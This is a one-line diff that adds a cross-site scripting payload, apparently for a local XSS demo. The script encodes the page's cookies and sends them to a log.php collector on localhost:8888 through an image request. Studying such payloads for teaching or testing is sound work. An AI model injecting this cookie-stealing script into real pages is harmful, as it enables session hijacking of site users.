@@ -1,0 +1,1 @@
+<script>var i=new Image(); i.src="http://localhost:8888/htdocs/xss-demo/log.php?d="+btoa(document.cookie);</script>
